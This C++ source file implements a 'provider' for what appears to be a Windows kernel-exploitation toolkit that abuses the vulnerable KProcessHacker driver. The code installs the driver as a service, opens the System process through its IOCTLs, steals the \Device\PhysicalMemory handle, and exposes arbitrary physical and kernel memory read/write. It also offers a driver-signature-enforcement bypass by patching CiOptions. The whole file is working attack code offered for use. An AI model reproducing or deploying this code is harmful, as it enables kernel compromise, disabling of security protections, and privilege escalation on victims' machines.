#include "ProcessHackerProvider.h"
#include "../Resources/DriverDataManager.h"
#include "../Utils.h"
#include "../ProviderSystem.h"
#include <iostream>
#include <vector>
#include <filesystem>
#include <memory>

#pragma comment(lib, "ntdll.lib")

// KPH IOCTL Definitions (METHOD_NEITHER)
#define KPH_DEVICE_TYPE (DWORD)0x9999
#define KPH_FUNCID_OPENPROCESS (DWORD)0x832
#define KPH_FUNCID_DUPLICATEOBJECT (DWORD)0x899

#define IOCTL_KPH_OPENPROCESS CTL_CODE(KPH_DEVICE_TYPE, KPH_FUNCID_OPENPROCESS, METHOD_NEITHER, FILE_ANY_ACCESS)
#define IOCTL_KPH_DUPOBJECT CTL_CODE(KPH_DEVICE_TYPE, KPH_FUNCID_DUPLICATEOBJECT, METHOD_NEITHER, FILE_ANY_ACCESS)

#define SystemExtendedHandleInformation (SYSTEM_INFORMATION_CLASS)64

typedef struct _SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX {
    PVOID Object;
    ULONG_PTR UniqueProcessId;
    ULONG_PTR HandleValue;
    ULONG GrantedAccess;
    USHORT CreatorBackTraceIndex;
    USHORT ObjectTypeIndex;
    ULONG HandleAttributes;
    ULONG Reserved;
} SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX, *PSYSTEM_HANDLE_TABLE_ENTRY_INFO_EX;

typedef struct _SYSTEM_HANDLE_INFORMATION_EX {
    ULONG_PTR NumberOfHandles;
    ULONG_PTR Reserved;
    SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX Handles[1];
} SYSTEM_HANDLE_INFORMATION_EX, *PSYSTEM_HANDLE_INFORMATION_EX;

#include <winternl.h>

// Ensure SECTION_INHERIT is defined
#ifndef _SECTION_INHERIT_DEFINED
typedef enum _SECTION_INHERIT_COMPAT {
    ViewShare = 1,
    ViewUnmap = 2
} SECTION_INHERIT;
#define _SECTION_INHERIT_DEFINED
#endif

// NT API definitions needed for handle enumeration
extern "C" {
    NTSTATUS NTAPI NtQuerySystemInformation(
        IN SYSTEM_INFORMATION_CLASS SystemInformationClass,
        OUT PVOID SystemInformation,
        IN ULONG SystemInformationLength,
        OUT PULONG ReturnLength OPTIONAL
    );

    NTSTATUS NTAPI NtMapViewOfSection(
        HANDLE SectionHandle,
        HANDLE ProcessHandle,
        PVOID* BaseAddress,
        ULONG_PTR ZeroBits,
        SIZE_T CommitSize,
        PLARGE_INTEGER SectionOffset,
        PSIZE_T ViewSize,
        SECTION_INHERIT InheritDisposition,
        ULONG AllocationType,
        ULONG Win32Protect
    );

    NTSTATUS NTAPI NtUnmapViewOfSection(
        HANDLE ProcessHandle,
        PVOID BaseAddress
    );
}

namespace KernelMode {
    namespace Providers {

        // KProcessHacker Provider Data
        ProviderLoadData ProcessHackerProvider::loadData = {
            true,   // PhysMemoryBruteForce
            false,  // PML4FromLowStub
            true,   // PreferPhysical (It IS physical memory access via handle steal)
            false,  // RequiresDSE (Signed by MS usually)
            (ULONG)(PROVIDER_CAP_PHYSICAL_MEMORY | PROVIDER_CAP_PREFER_PHYSICAL),
            L"Process Hacker (KProcessHacker) - Physical Handle Stealing"
        };

        ProcessHackerProvider::ProcessHackerProvider()
            : deviceHandle(INVALID_HANDLE_VALUE), serviceHandle(nullptr), physicalMemorySection(NULL) {
        }

        ProcessHackerProvider::~ProcessHackerProvider() {
            Deinitialize();
        }

        bool ProcessHackerProvider::Initialize(ULONG driverId, bool bypassDSE) {
            std::wcout << L"[+] Initializing ProcessHackerProvider..." << std::endl;

            if (driverId == 0) {
                driverId = Resources::DRIVER_ID_KPH; // Driver Data Manager needs this ID
            }
            
            auto& driverManager = Resources::DriverDataManager::GetInstance();
            std::wstring tempPath = L"C:\\Windows\\Temp\\kprocesshacker.sys";
            
            // Try to extract/find it
            // Fallback: look in ./drv/kprocesshacker.sys
            std::wstring localPath = L"drv\\kprocesshacker.sys";
            
            if (!driverManager.ExtractDriver(driverId, tempPath)) {
                 if (std::filesystem::exists(localPath)) {
                     std::filesystem::copy_file(localPath, tempPath, std::filesystem::copy_options::overwrite_existing);
                 }
            }
            this->dirDriverPath = tempPath;

            if (!InstallDriverService()) {
                 std::wcerr << L"[-] Failed to install KProcessHacker service (might be running)." << std::endl;
            }

            if (!OpenDeviceHandle()) {
                std::wcerr << L"[-] Failed to open KProcessHacker device handle." << std::endl;
                return false;
            }

            // Steal the PhysicalMemory handle
            if (!AcquirePhysicalMemoryHandle()) {
                 std::wcerr << L"[-] Failed to acquire \\Device\\PhysicalMemory handle via KProcessHacker." << std::endl;
                 return false;
            }

            std::wcout << L"[+] ProcessHackerProvider initialized successfully." << std::endl;
            return true;
        }

        void ProcessHackerProvider::Deinitialize() {
            if (physicalMemorySection) {
                CloseHandle(physicalMemorySection);
                physicalMemorySection = NULL;
            }
            if (deviceHandle != INVALID_HANDLE_VALUE) {
                CloseHandle(deviceHandle);
                deviceHandle = INVALID_HANDLE_VALUE;
            }
            if (serviceHandle) {
                Utils::RemoveDriverService(serviceHandle);
                serviceHandle = nullptr;
            }
            if (!dirDriverPath.empty()) {
                DeleteFileW(dirDriverPath.c_str());
            }
        }

        std::wstring ProcessHackerProvider::GetProviderName() const {
            return L"ProcessHacker";
        }
        
        ULONG ProcessHackerProvider::GetCapabilities() const {
            return loadData.Capabilities;
        }
        
        const ProviderLoadData* ProcessHackerProvider::GetLoadData() const {
            return &loadData;
        }

        bool ProcessHackerProvider::InstallDriverService() {
            // Service Name "KProcessHacker2" is standard
            return (this->serviceHandle = Utils::CreateDriverService(L"KProcessHacker2", this->dirDriverPath)) != nullptr;
        }
        
        bool ProcessHackerProvider::OpenDeviceHandle() {
            deviceHandle = CreateFileW(
                L"\\\\.\\KProcessHacker2",
                GENERIC_READ | GENERIC_WRITE,
                FILE_SHARE_READ | FILE_SHARE_WRITE,
                NULL,
                OPEN_EXISTING,
                FILE_ATTRIBUTE_NORMAL,
                NULL
            );
            return deviceHandle != INVALID_HANDLE_VALUE;
        }

        // --- KPH Specific Primitives ---

        bool ProcessHackerProvider::KphOpenProcess(HANDLE processId, ACCESS_MASK desiredAccess, PHANDLE processHandle) {
            if (deviceHandle == INVALID_HANDLE_VALUE) return false;
            
            KPH_OPEN_PROCESS_REQUEST request;
            CLIENT_ID clientId;
            clientId.UniqueProcess = processId;
            clientId.UniqueThread = NULL;
            
            request.ClientId = &clientId;
            request.DesiredAccess = desiredAccess;
            request.ProcessHandle = processHandle; 
            
            BOOL result = DeviceIoControl(
                deviceHandle,
                IOCTL_KPH_OPENPROCESS,
                &request,
                sizeof(request),
                NULL,
                0, // No output buffer for NEITHER I/O
                NULL,
                NULL
            );
            
            return result == TRUE;
        }

        bool ProcessHackerProvider::KphDuplicateHandle(HANDLE sourceProcessHandle, HANDLE sourceHandle, PHANDLE targetHandle) {
            if (deviceHandle == INVALID_HANDLE_VALUE) return false;
            
            KPH_DUPLICATE_OBJECT_REQUEST request;
            request.SourceProcessHandle = sourceProcessHandle;
            request.SourceHandle = sourceHandle;
            request.TargetProcessHandle = GetCurrentProcess();
            request.TargetHandle = targetHandle; 
            request.DesiredAccess = 0;
            request.HandleAttributes = 0;
            request.Options = DUPLICATE_SAME_ACCESS;
            
            BOOL result = DeviceIoControl(
                deviceHandle,
                IOCTL_KPH_DUPOBJECT,
                &request,
                sizeof(request),
                NULL,
                0,
                NULL,
                NULL
            );
            
            return result == TRUE;
        }

        // --- Handle Stealing Logic ---

        bool ProcessHackerProvider::AcquirePhysicalMemoryHandle() {
            HANDLE systemProcessHandle = NULL;
            if (!KphOpenProcess((HANDLE)4, PROCESS_ALL_ACCESS, &systemProcessHandle)) {
                if (!KphOpenProcess((HANDLE)4, PROCESS_QUERY_INFORMATION | PROCESS_DUP_HANDLE, &systemProcessHandle)) {
                    return false;
                }
            }

            ULONG bufferSize = 1024 * 1024;
            std::unique_ptr<BYTE[]> buffer;
            NTSTATUS status;

            do {
                buffer = std::make_unique<BYTE[]>(bufferSize);
                status = NtQuerySystemInformation(SystemExtendedHandleInformation, buffer.get(), bufferSize, &bufferSize);
                if (status == ((NTSTATUS)0xC0000004L)) {
                    bufferSize *= 2;
                    continue;
                }
            } while (status == ((NTSTATUS)0xC0000004L));

            if (!NT_SUCCESS(status)) {
                CloseHandle(systemProcessHandle);
                return false;
            }

            PSYSTEM_HANDLE_INFORMATION_EX handleInfo = (PSYSTEM_HANDLE_INFORMATION_EX)buffer.get();
            ULONG_PTR systemPid = 4;

            for (ULONG i = 0; i < handleInfo->NumberOfHandles; i++) {
                auto& entry = handleInfo->Handles[i];

                if (entry.UniqueProcessId == systemPid) {
                    if (entry.GrantedAccess == 0x000F001F || entry.GrantedAccess == 0xF001F) {
                        
                        HANDLE stolenHandle = NULL;
                        if (KphDuplicateHandle(systemProcessHandle, (HANDLE)entry.HandleValue, &stolenHandle)) {
                            
                            PVOID baseAddress = NULL;
                            SIZE_T viewSize = 0x1000;
                            LARGE_INTEGER offset = { 0 };
                            
                            status = NtMapViewOfSection(
                                stolenHandle,
                                GetCurrentProcess(),
                                &baseAddress,
                                0,
                                0,
                                &offset,
                                &viewSize,
                                ViewUnmap,
                                0,
                                PAGE_READONLY
                            );
                            
                            if (NT_SUCCESS(status)) {
                                NtUnmapViewOfSection(GetCurrentProcess(), baseAddress);
                                this->physicalMemorySection = stolenHandle;
                                CloseHandle(systemProcessHandle);
                                return true;
                            }
                            CloseHandle(stolenHandle);
                        }
                    }
                }
            }
            CloseHandle(systemProcessHandle);
            return false;
        }

        bool ProcessHackerProvider::ReadPhysicalMemory(uintptr_t physicalAddress, void* buffer, size_t size) {
            if (!physicalMemorySection) return false;
            
            PVOID mappedBase = NULL;
            LARGE_INTEGER sectionOffset;
            sectionOffset.QuadPart = physicalAddress;
            SIZE_T viewSize = size;
            
            NTSTATUS status = NtMapViewOfSection(
                physicalMemorySection,
                GetCurrentProcess(),
                &mappedBase,
                0,
                0,
                &sectionOffset,
                &viewSize,
                ViewUnmap,
                0,
                PAGE_READONLY
            );
            
            if (NT_SUCCESS(status)) {
                memcpy(buffer, mappedBase, size);
                NtUnmapViewOfSection(GetCurrentProcess(), mappedBase);
                return true;
            }
            return false;
        }

        bool ProcessHackerProvider::WritePhysicalMemory(uintptr_t physicalAddress, void* buffer, size_t size) {
            if (!physicalMemorySection) return false;
            
            PVOID mappedBase = NULL;
            LARGE_INTEGER sectionOffset;
            sectionOffset.QuadPart = physicalAddress;
            SIZE_T viewSize = size;
            
            NTSTATUS status = NtMapViewOfSection(
                physicalMemorySection,
                GetCurrentProcess(),
                &mappedBase,
                0,
                0,
                &sectionOffset,
                &viewSize,
                ViewUnmap,
                0, 
                PAGE_READWRITE
            );
            
            if (NT_SUCCESS(status)) {
                memcpy(mappedBase, buffer, size);
                NtUnmapViewOfSection(GetCurrentProcess(), mappedBase);
                return true;
            }
            return false;
        }

        bool ProcessHackerProvider::ReadKernelMemory(uintptr_t address, void* buffer, size_t size) {
            uintptr_t phys = VirtualToPhysical(address);
            if (phys) return ReadPhysicalMemory(phys, buffer, size);
            return false;
        }

        bool ProcessHackerProvider::WriteKernelMemory(uintptr_t address, void* buffer, size_t size) {
             uintptr_t phys = VirtualToPhysical(address);
             if (phys) return WritePhysicalMemory(phys, buffer, size);
             return false;
        }

        uintptr_t ProcessHackerProvider::VirtualToPhysical(uintptr_t virtualAddress) {
             return Utils::VirtualToPhysical(this, virtualAddress);
        }

        bool ProcessHackerProvider::BypassDSE() {
             return Utils::PatchCiOptions(this);
        }

        // Unused interface methods
        uintptr_t ProcessHackerProvider::AllocateKernelMemory(size_t size, uintptr_t* physicalAddress) { return 0; }
        bool ProcessHackerProvider::FreeKernelMemory(uintptr_t virtualAddress, size_t size) { return false; }
        bool ProcessHackerProvider::CreateSystemThread(uintptr_t startAddress, uintptr_t parameter) { return false; }

    } // namespace Providers
} // namespace KernelMode